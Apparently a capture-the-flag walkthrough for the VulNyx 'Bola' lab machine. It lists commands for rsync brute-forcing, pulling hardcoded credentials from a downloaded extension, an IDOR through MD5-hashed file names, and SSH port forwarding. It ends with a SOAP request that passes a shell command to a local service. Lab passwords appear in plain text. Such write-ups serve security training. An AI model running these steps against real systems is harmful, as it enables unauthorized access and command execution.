___

```bash
export IP=192.168.0.24
./nmap.sh
```

/etc/hosts --> bola.nyx

# 873 Rsync

https://github.com/VulNyx/Arsenal/tree/main/rsync-brute

```bash
./rsync-brute -t bola.nyx -p 873 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
rsync -av --list-only rsync://192.168.0.24/extensions
```

```bash
rsync -avz rsync://bola.nyx/extensions/password_manager.zip .
```

```bash
cat background.js
username: "jackie0x17@nyx.com", password: "sbIJ0x9g{C3`"
```

# 80

```bash
gobuster dir -u http://bola.nyx/ -w /home/dani/Documents/lists/content.txt -t 200
```

http://bola.nyx/.well-known/openid-configuration

usernames
```
d4t4s3c
jackie0x17
ct0l4
```


```bash
echo -n "d4t4s3c"| md5sum
97035ded598faa2ce8ff63f7f9dd3b70
```

http://bola.nyx/download.php?file_name=97035ded598faa2ce8ff63f7f9dd3b70.pdf

admin:VulNyxtestinglogin123

# 22

```bash
ssh -L 9000:127.0.0.1:9000 d4t4s3c@bola.nyx
VulNyxtestinglogin123
```

# WSDL

```bash
curl -X POST http://localhost:9000 -H "Content-Type: text/xml; charset=utf-8" -H 
"SOAPAction: \"ExecuteCommand\"" -d '<?xml version="1.0" encoding="utf-8"?>  
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns="http://localhost/wsdl">  
  <soapenv:Header/>  
  <soapenv:Body>  
     <LoginRequest>  
        <cmd>whoami</cmd>  
     <LoginRequest>  
  </soapenv:Body>  
</soapenv:Envelope>
```












